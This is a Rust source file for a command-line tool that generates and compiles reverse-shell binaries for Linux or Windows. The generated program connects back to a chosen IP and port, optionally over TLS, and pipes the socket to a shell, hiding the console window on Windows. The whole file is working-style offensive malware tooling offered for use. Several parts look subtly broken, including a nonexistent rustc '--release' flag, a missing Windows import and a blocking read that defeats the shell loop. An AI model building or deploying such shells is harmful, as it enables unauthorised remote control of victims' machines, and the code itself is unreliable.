use clap::Parser;
use std::path::PathBuf;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Target IP address
    #[arg(short, long)]
    ip: String,

    /// Target port number
    #[arg(short, long)]
    port: u16,

    /// Target operating system (linux or windows)
    #[arg(short, long, value_enum)]
    os: OsTarget,

    /// Shell path (default: /bin/sh for Linux, cmd.exe for Windows)
    #[arg(short, long)]
    shell: Option<String>,

    /// Enable TLS support
    #[arg(short, long)]
    tls: bool,

    /// Output binary path
    #[arg(short, long)]
    output: PathBuf,
}

#[derive(clap::ValueEnum, Clone, Debug)]
enum OsTarget {
    Linux,
    Windows,
}

fn main() -> anyhow::Result<()> {
    let args = Args::parse();
    
    // Generate the reverse shell code
    let shell_code = generate_shell_code(&args)?;
    
    // Create a temporary file for the shell code
    let temp_dir = tempfile::tempdir()?;
    let source_file = temp_dir.path().join("shell.rs");
    std::fs::write(&source_file, shell_code)?;
    
    // Compile the code
    compile_shell(&source_file, &args.output)?;
    
    println!("Shell binary generated at: {}", args.output.display());
    Ok(())
}

fn generate_shell_code(args: &Args) -> anyhow::Result<String> {
    let shell_path = args.shell.clone().unwrap_or_else(|| {
        match args.os {
            OsTarget::Linux => "/bin/sh".to_string(),
            OsTarget::Windows => "cmd.exe".to_string(),
        }
    });

    let mut code = String::new();

    // Add necessary imports based on OS
    match args.os {
        OsTarget::Linux => {
            code.push_str(r#"
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};
"#);
        }
        OsTarget::Windows => {
            code.push_str(r#"
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
"#);
        }
    }

    // Add TLS imports if enabled
    if args.tls {
        code.push_str(r#"
use native_tls::TlsConnector;
"#);
    }

    // Main function
    code.push_str(&format!(r#"
fn main() -> io::Result<()> {{
    let addr = "{}:{}";
    let stream = TcpStream::connect(addr)?;
"#, args.ip, args.port));

    if args.tls {
        code.push_str(r#"
    let connector = TlsConnector::new()?;
    let mut stream = connector.connect("", stream)?;
"#);
    } else {
        code.push_str(r#"
    let mut stream = stream;
"#);
    }

    // OS-specific shell handling
    match args.os {
        OsTarget::Linux => {
            code.push_str(&format!(r#"
    let mut child = Command::new("{}")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;
"#, shell_path));
        }
        OsTarget::Windows => {
            code.push_str(&format!(r#"
    let mut child = Command::new("{}")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .spawn()?;
"#, shell_path));
        }
    }

    // Add the main loop for shell interaction
    code.push_str(r#"
    let mut buffer = [0; 1024];
    loop {
        let n = stream.read(&mut buffer)?;
        if n == 0 { break; }
        
        child.stdin.as_mut().unwrap().write_all(&buffer[..n])?;
        child.stdin.as_mut().unwrap().flush()?;
        
        let mut output = String::new();
        child.stdout.as_mut().unwrap().read_to_string(&mut output)?;
        stream.write_all(output.as_bytes())?;
        stream.flush()?;
    }
    Ok(())
}
"#);

    Ok(code)
}

fn compile_shell(source_file: &std::path::Path, output_file: &std::path::Path) -> anyhow::Result<()> {
    let status = std::process::Command::new("rustc")
        .arg("--release")
        .arg("-o")
        .arg(output_file)
        .arg(source_file)
        .status()?;

    if !status.success() {
        anyhow::bail!("Failed to compile shell code");
    }

    Ok(())
}
